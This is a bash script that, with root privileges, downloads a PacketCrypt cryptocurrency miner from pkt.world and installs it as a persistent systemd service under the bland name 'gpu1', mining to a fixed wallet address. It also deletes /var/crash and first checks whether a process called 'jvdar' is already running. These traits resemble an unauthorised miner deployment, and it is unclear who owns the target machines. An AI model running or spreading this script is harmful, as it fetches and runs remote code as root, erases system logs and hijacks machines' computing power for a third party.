count=`pgrep jvdar |  grep -o -E '[0-9]+'`

if [[ $count -gt 0 ]]
then
  echo "dang ton tai"
else
cd /home

sudo wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt
sudo chmod +x packetcrypt
sudo rm -rf /lib/systemd/system/pktpool.service
sudo rm -rf /var/crash
sudo bash -c 'cat <<EOT >>/lib/systemd/system/pktpool.service 
[Unit]
Description=gpu1
After=network.target
[Service]
ExecStart= /home/packetcrypt ann -p p5ZefyJJjHJ8betgpoL39DdAAogum6oCV5 http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&



sudo systemctl daemon-reload &&
sudo sudo systemctl enable pktpool.service &&
sudo sudo service pktpool stop  &&
sudo service pktpool restart



fi
